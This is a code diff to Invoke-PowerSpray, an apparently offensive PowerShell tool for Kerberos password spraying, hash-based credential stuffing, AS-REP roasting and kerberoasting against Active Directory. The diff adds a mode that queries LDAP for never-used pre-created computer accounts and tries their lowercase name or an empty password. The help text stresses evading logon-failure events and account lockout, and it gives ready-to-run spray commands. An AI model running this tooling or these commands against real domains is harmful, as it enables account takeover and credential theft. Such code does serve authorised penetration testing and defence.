@@ -9,21 +9,30 @@ Function Invoke-PowerSpray {
     Invoke-PowerSpray checks usernames and passwords (plain-text or NTLM hashes) by sending Kerberos AS-REQ.
     Spraying attack can be performed against all the domain users retrieved from LDAP directory, while checking their "badPwdCount" attribute to prevent account lockout and identify previous passwords.
     Stuffing attack can be performed using NTLM password hashes dumped from a compromised domain against another target domain in order to identify credential reuse.
-    Since failing Kerberos preauthentication does not trigger traditional logon failure event, it is a stealthy way to credential guessing.
+    Since failing Kerberos preauthentication does not trigger traditional logon failure event, it may be a stealthy way to credential guessing.
     Moreover, roasting attacks can be performed to retrieve encrypted material via users that do not have preauthentication required.
     It is highly inspired from Rubeus (by @harmj0y) for the Kerberos part and from Invoke-BadPwdCountScanner (by @rindert-fox) for the LDAP part.
 
-.PARAMETER Username
+.PARAMETER UserName
     Specifies the identifier of an account to send the AS-REQ for.
 
 .PARAMETER UserFile
     Specifies a file containing a list of usernames to send the AS-REQ for.
+
+.PARAMETER ServiceName
+    Specifies the identifier of a service account to target for kerberoasting.
+
+.PARAMETER ServiceFile
+    Specifies a file containing a list of service names to target for kerberoasting.
 
 .PARAMETER EmptyPassword
     Specifies empty password for each authentication attempt. When `-Ldap` switch is enabled, user list is filtered based on the UF_PASSWD_NOTREQD flag.
 
 .PARAMETER UserAsPassword
     Specifies username as password for each authentication attempt (default case, lowercase or uppercase).
+
+.PARAMETER PreCreatedComputer
+    Specifies computer name as password (without the trailing '$') or empty password for each authentication attempt.
 
 .PARAMETER Password
     Specifies the password for authentication attempts.
@@ -88,10 +97,14 @@ Function Invoke-PowerSpray {
 
 .EXAMPLE
     Password spraying against all domain users using username as password:
-    PS C:\> Invoke-PowerSpray -Server DC.ADATUM.CORP -Ldap -UserAsPassword -BloodHound -Neo4jCredential neo4j
+    PS C:\> Invoke-PowerSpray -Server DC.ADATUM.CORP -Ldap -UserAsPassword default -BloodHound -Neo4jCredential neo4j
 
 .EXAMPLE
-    Perform spraying attack against all domain users using a given password:
+    Password spraying against pre-created computer accounts:
+    PS C:\> Invoke-PowerSpray -Server DC.ADATUM.CORP -Ldap -PreCreatedComputer ComputerAsPassword
+
+.EXAMPLE
+    Password spraying against all domain users using a given password:
     PS C:\> Invoke-PowerSpray -Server DC.ADATUM.CORP -Ldap -LdapCredential testuser@ADATUM.CORP -Password 'Welcome2020'
 
 .EXAMPLE
@@ -127,6 +140,10 @@ Function Invoke-PowerSpray {
         [ValidateSet('default', 'lowercase', 'uppercase')]
         [String]
         $UserAsPassword,
+
+        [ValidateSet('ComputerAsPassword', 'EmptyPassword')]
+        [String]
+        $PreCreatedComputer,
 
         [String]
         $Password,
@@ -214,12 +231,12 @@ Function Invoke-PowerSpray {
         if ($CheckOldPwd -and ($PSBoundParameters.ContainsKey('Password') -or $PSBoundParameters.ContainsKey('Hash') -or $PSBoundParameters.ContainsKey('UserAsPassword') -or $PSBoundParameters.ContainsKey('EmptyPassword'))) {
             # Check if the Server has PDC role
             $pdcServers = (Resolve-DnsName -Server $domain -Name "_ldap._tcp.pdc._msdcs.$domain" -Type SRV -Verbose:$false).IPAddress
-            if (-not ($pdcServers -contains $Server)) {
+            if (-not ($pdcServers.Contains($Server))) {
                 Write-Warning "The domain controller specified doesn't not seem to have PDC role. Bad result may occur due to replication issues with badPwdCount attribute"
             }
         }
 
-        if (-not $LockoutThreshold -and ($PSBoundParameters.ContainsKey('Password') -or $PSBoundParameters.ContainsKey('Hash') -or $PSBoundParameters.ContainsKey('UserAsPassword') -or $PSBoundParameters.ContainsKey('EmptyPassword'))) {
+        if (-not $LockoutThreshold -and ($PSBoundParameters.ContainsKey('Password') -or $PSBoundParameters.ContainsKey('Hash') -or $PSBoundParameters.ContainsKey('UserAsPassword') -or $PSBoundParameters.ContainsKey('EmptyPassword') -or $PSBoundParameters.ContainsKey('PreCreatedComputer'))) {
             # Get lockout threshold defined in Default Password Policy
             $LockoutThreshold = (Get-LdapObject -ADSpath $adsPath -Credential $LdapCredential -Filter '(objectClass=domain)' -Properties 'lockoutThreshold' -SearchScope 'Base').lockoutThreshold
             Write-Warning "LockoutThreshold value defined in Default Password Policy is $LockoutThreshold"
@@ -234,6 +251,14 @@ Function Invoke-PowerSpray {
     }
     if ($PSBoundParameters.ContainsKey('EmptyPassword')) {
         $pass = ''
+    }
+    if ($PSBoundParameters.ContainsKey('PreCreatedComputer')) {
+        if (-not $PSBoundParameters.ContainsKey('EncType')) {
+            $EncType = 'RC4'
+        }
+        if ($PreCreatedComputer -eq 'EmptyPassword') {
+            $pass = ''
+        }
     }
 
     $nthash = $null
@@ -257,7 +282,7 @@ Function Invoke-PowerSpray {
             if ($Ldap) {
                 $filter = "&((samAccountName=$serviceName)(servicePrincipalName=*))"
                 if (-not ($service = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential)) {
-                    Write-Verbose "$($userName)@$($domain) does not exist"
+                    Write-Verbose "$($serviceName)@$($domain) does not exist"
                 }
             }
             if ($service -or -not $Ldap) {
@@ -275,6 +300,9 @@ Function Invoke-PowerSpray {
             $filter = "(samAccountName=$UserName)"
             if ($PSBoundParameters.ContainsKey('EmptyPassword')) {
                 $filter = "(&(userAccountControl:1.2.840.113556.1.4.803:=32)$filter)"
+            }
+            if ($PSBoundParameters.ContainsKey('PreCreatedComputer')) {
+                $filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=32)(userAccountControl:1.2.840.113556.1.4.803:=4096)$filter)"
             }
             if ($user = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential) {
                 $badPwdCount = $user.badPwdCount
@@ -296,7 +324,10 @@ Function Invoke-PowerSpray {
                 }
             }
         }
-        $cred = [pscustomobject] @{Domain = $domain; Username = $UserName; Password = $pass; NTHash = $nthash; BadPwdCount = $badPwdCount}
+        if ($PSBoundParameters.ContainsKey('PreCreatedComputer') -and $PreCreatedComputer -eq 'ComputerAsPassword') {
+            $pass = $UserName.ToLower().TrimEnd('$')
+        }
+        $cred = [pscustomobject] @{Domain = $domain; UserName = $UserName; Password = $pass; NTHash = $nthash; BadPwdCount = $badPwdCount}
         $credentials.add($cred) | Out-Null
     }
     elseif ($UserFile) {
@@ -306,6 +337,9 @@ Function Invoke-PowerSpray {
                 $filter = "(samAccountName=$userName)"
                 if ($PSBoundParameters.ContainsKey('EmptyPassword')) {
                     $filter = "(&(userAccountControl:1.2.840.113556.1.4.803:=32)$filter)"
+                }
+                if ($PSBoundParameters.ContainsKey('PreCreatedComputer')) {
+                    $filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=32)(userAccountControl:1.2.840.113556.1.4.803:=4096)$filter)"
                 }
                 if ($user = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential) {
                     $badPwdCount = $user.badPwdCount
@@ -328,7 +362,10 @@ Function Invoke-PowerSpray {
                         }
                     }
                 }
-                $cred = [pscustomobject] @{Domain = $domain; Username = $userName; Password = $pass; NTHash = $nthash; BadPwdCount = $badPwdCount}
+                if ($PSBoundParameters.ContainsKey('PreCreatedComputer') -and $PreCreatedComputer -eq 'ComputerAsPassword') {
+                    $pass = $UserName.ToLower().TrimEnd('$')
+                }
+                $cred = [pscustomobject] @{Domain = $domain; UserName = $userName; Password = $pass; NTHash = $nthash; BadPwdCount = $badPwdCount}
                 $credentials.add($cred) | Out-Null
             }
         }
@@ -346,6 +383,9 @@ Function Invoke-PowerSpray {
                     $filter = "(samAccountName=$userName)"
                     if ($PSBoundParameters.ContainsKey('EmptyPassword')) {
                         $filter = "(&(userAccountControl:1.2.840.113556.1.4.803:=32)$filter)"
+                    }
+                    if ($PSBoundParameters.ContainsKey('PreCreatedComputer')) {
+                        $filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=32)(userAccountControl:1.2.840.113556.1.4.803:=4096)$filter)"
                     }
                     if ($user = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential) {
                         $badPwdCount = $user.badPwdCount
@@ -370,7 +410,10 @@ Function Invoke-PowerSpray {
                             }
                         }
                     }
-                    $cred = [pscustomobject] @{Domain = $domain; Username = $userName; Password = $pass; NTHash = $nthash; BadPwdCount = $badPwdCount}
+                    if ($PSBoundParameters.ContainsKey('PreCreatedComputer') -and $PreCreatedComputer -eq 'ComputerAsPassword') {
+                        $pass = $UserName.ToLower().TrimEnd('$')
+                    }
+                    $cred = [pscustomobject] @{Domain = $domain; UserName = $userName; Password = $pass; NTHash = $nthash; BadPwdCount = $badPwdCount}
                     $credentials.add($cred) | Out-Null
                 }
             }
@@ -382,7 +425,7 @@ Function Invoke-PowerSpray {
         foreach($userAccountControl in $disabledUserAccountControl) {
             $filter += "(!userAccountControl:1.2.840.113556.1.4.803:=$userAccountControl)"
         }
-        if (-not ($PSBoundParameters.ContainsKey('Password') -or $PSBoundParameters.ContainsKey('Hash') -or $PSBoundParameters.ContainsKey('UserAsPassword') -or $PSBoundParameters.ContainsKey('EmptyPassword'))) {
+        if (-not ($PSBoundParameters.ContainsKey('Password') -or $PSBoundParameters.ContainsKey('Hash') -or $PSBoundParameters.ContainsKey('UserAsPassword') -or $PSBoundParameters.ContainsKey('EmptyPassword') -or $PSBoundParameters.ContainsKey('PreCreatedComputer'))) {
             # Find all enabled users without kerberos preauthentication enabled (AS-REP roasting)
             $filter1 = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)$filter)"
             $users = Get-LdapObject -ADSpath $adsPath -Filter $filter1 -Properties $properties -Credential $LdapCredential
@@ -393,14 +436,20 @@ Function Invoke-PowerSpray {
             }
         }
         else {
-            # Find all enabled users with badPwdCount < LockoutThreshold (spraying)
             if ($LockoutThreshold -gt 0) {
                 $filter = "(&(!(badPwdCount>=$LockoutThreshold))$filter)"
             }
             if ($PSBoundParameters.ContainsKey('EmptyPassword')) {
                 $filter = "(&(userAccountControl:1.2.840.113556.1.4.803:=32)$filter)"
             }
-            $filter = "(&(samAccountType=805306368)$filter)"
+            if ($PSBoundParameters.ContainsKey('PreCreatedComputer')) {
+                # Find all enabled computers with badPwdCount < LockoutThreshold that have never been used (spraying)
+                $filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=32)(userAccountControl:1.2.840.113556.1.4.803:=4096)(logonCount=0)$filter)"
+            }
+            else {
+                # Find all enabled users with badPwdCount < LockoutThreshold (spraying)
+                $filter = "(&(samAccountType=805306368)$filter)"
+            }
             $users = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential
         }
         foreach ($user in $users) {
@@ -417,7 +466,10 @@ Function Invoke-PowerSpray {
                     }
                 }
             }
-            $cred = [pscustomobject] @{Domain = $domain; Username = $user.samAccountName; Password = $pass; NTHash = $nthash; BadPwdCount = $user.badPwdCount}
+            if ($PSBoundParameters.ContainsKey('PreCreatedComputer') -and $PreCreatedComputer -eq 'ComputerAsPassword') {
+                $pass = $user.samAccountName.ToLower().TrimEnd('$')
+            }
+            $cred = [pscustomobject] @{Domain = $domain; UserName = $user.samAccountName; Password = $pass; NTHash = $nthash; BadPwdCount = $user.badPwdCount}
             $credentials.add($cred) | Out-Null
         }
     }
@@ -730,7 +782,7 @@ Function Local:New-KerberosSpray {
     if ($noPreauthUser) {
         # Kerberoasting without preauthentication
         foreach ($service in $Services) {
-            $serviceCred = [pscustomobject] @{Domain = $domain; Username = $service}
+            $serviceCred = [pscustomobject] @{Domain = $domain; UserName = $service}
             $AS_REP = New-KerbPreauth -EncType $eType -UserName $noPreauthUser.Username -Domain $noPreauthUser.Domain -Server $Server -ServiceName $service
             $asn_AS_REP = [Asn1.AsnElt]::Decode($AS_REP, $false)
             $tag = $asn_AS_REP.TagValue
